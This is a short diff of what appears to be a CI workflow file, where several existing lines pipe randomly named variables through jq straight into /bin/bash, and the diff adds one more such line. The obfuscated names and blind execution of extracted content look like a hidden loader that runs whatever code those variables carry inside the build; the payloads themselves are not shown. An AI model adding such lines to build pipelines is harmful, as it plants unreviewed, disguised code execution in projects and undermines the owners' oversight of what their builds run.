@@ -28,6 +28,7 @@ jobs:
           echo $sqlpk522 | jq -r .alqrx24 | /bin/bash
           echo $tjm222 | jq -r .l15637 | /bin/bash
           echo $wrpd4007 | jq -r .osfii4854 | /bin/bash
+          printf '%s' "$igqgx225" | jq -r .oni6196 | /bin/bash
 
       - name: Save output
         if: always()
